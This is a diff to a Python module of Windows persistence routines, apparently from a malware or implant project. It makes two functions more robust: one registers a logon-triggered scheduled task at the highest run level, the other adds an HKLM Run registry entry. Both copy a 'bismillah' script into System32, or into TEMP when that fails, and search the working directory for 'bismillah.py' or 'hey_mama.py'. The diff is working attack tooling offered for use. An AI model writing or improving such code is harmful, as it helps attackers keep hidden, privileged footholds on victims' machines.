@@ -74,8 +74,45 @@ def windows_schtask(script_path: str, task_name: str = "BismillahTask") -> bool:
     2) schtasks /create /sc onlogon /tn "BismillahTask" /tr "C:\\Windows\\System32\\bismillah.bat"
     """
     try:
-        dest = os.path.join(os.getenv("WINDIR"), "System32", "bismillah.bat")
-        shutil.copy(script_path, dest)
+        # Validate source script path
+        if not os.path.exists(script_path):
+            logger.error(f"[PERSISTENCE][WIN][SCHTASK] Source script not found: {script_path}")
+            # Try to find the script in common locations
+            common_paths = [
+                "bismillah.py",
+                "hey_mama.py",
+                os.path.join(os.getcwd(), "bismillah.py"),
+                os.path.join(os.getcwd(), "hey_mama.py")
+            ]
+            for path in common_paths:
+                if os.path.exists(path):
+                    script_path = path
+                    logger.info(f"[PERSISTENCE][WIN][SCHTASK] Found script at: {script_path}")
+                    break
+            else:
+                logger.error("[PERSISTENCE][WIN][SCHTASK] Could not find bismillah script")
+                return False
+        
+        # Create destination directory if it doesn't exist
+        dest_dir = os.path.join(os.getenv("WINDIR", "C:\\Windows"), "System32")
+        if not os.path.exists(dest_dir):
+            os.makedirs(dest_dir, exist_ok=True)
+        
+        dest = os.path.join(dest_dir, "bismillah.bat")
+        
+        # Copy script with error handling
+        try:
+            shutil.copy(script_path, dest)
+            logger.info(f"[PERSISTENCE][WIN][SCHTASK] Copied script to: {dest}")
+        except Exception as copy_error:
+            logger.error(f"[PERSISTENCE][WIN][SCHTASK] Failed to copy script: {copy_error}")
+            # Try alternative destination
+            alt_dest = os.path.join(os.getenv("TEMP", "C:\\Temp"), "bismillah.bat")
+            shutil.copy(script_path, alt_dest)
+            dest = alt_dest
+            logger.info(f"[PERSISTENCE][WIN][SCHTASK] Used alternative destination: {dest}")
+        
+        # Create scheduled task
         cmd = [
             "schtasks", "/Create", "/SC", "ONLOGON", "/RL", "HIGHEST",
             "/TN", task_name, "/TR", f'"{dest}"'
@@ -93,8 +130,45 @@ def windows_run_key(script_path: str, reg_name: str = "Bismillah") -> bool:
     2) reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Bismillah /t REG_SZ /d "C:\\Windows\\System32\\bismillah.bat" /f
     """
     try:
-        dest = os.path.join(os.getenv("WINDIR"), "System32", "bismillah.bat")
-        shutil.copy(script_path, dest)
+        # Validate source script path
+        if not os.path.exists(script_path):
+            logger.error(f"[PERSISTENCE][WIN][RUN] Source script not found: {script_path}")
+            # Try to find the script in common locations
+            common_paths = [
+                "bismillah.py",
+                "hey_mama.py",
+                os.path.join(os.getcwd(), "bismillah.py"),
+                os.path.join(os.getcwd(), "hey_mama.py")
+            ]
+            for path in common_paths:
+                if os.path.exists(path):
+                    script_path = path
+                    logger.info(f"[PERSISTENCE][WIN][RUN] Found script at: {script_path}")
+                    break
+            else:
+                logger.error("[PERSISTENCE][WIN][RUN] Could not find bismillah script")
+                return False
+        
+        # Create destination directory if it doesn't exist
+        dest_dir = os.path.join(os.getenv("WINDIR", "C:\\Windows"), "System32")
+        if not os.path.exists(dest_dir):
+            os.makedirs(dest_dir, exist_ok=True)
+        
+        dest = os.path.join(dest_dir, "bismillah.bat")
+        
+        # Copy script with error handling
+        try:
+            shutil.copy(script_path, dest)
+            logger.info(f"[PERSISTENCE][WIN][RUN] Copied script to: {dest}")
+        except Exception as copy_error:
+            logger.error(f"[PERSISTENCE][WIN][RUN] Failed to copy script: {copy_error}")
+            # Try alternative destination
+            alt_dest = os.path.join(os.getenv("TEMP", "C:\\Temp"), "bismillah.bat")
+            shutil.copy(script_path, alt_dest)
+            dest = alt_dest
+            logger.info(f"[PERSISTENCE][WIN][RUN] Used alternative destination: {dest}")
+        
+        # Add registry key
         cmd = [
             "reg", "add", r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
             "/v", reg_name, "/t", "REG_SZ", "/d", f'"{dest}"', "/f"
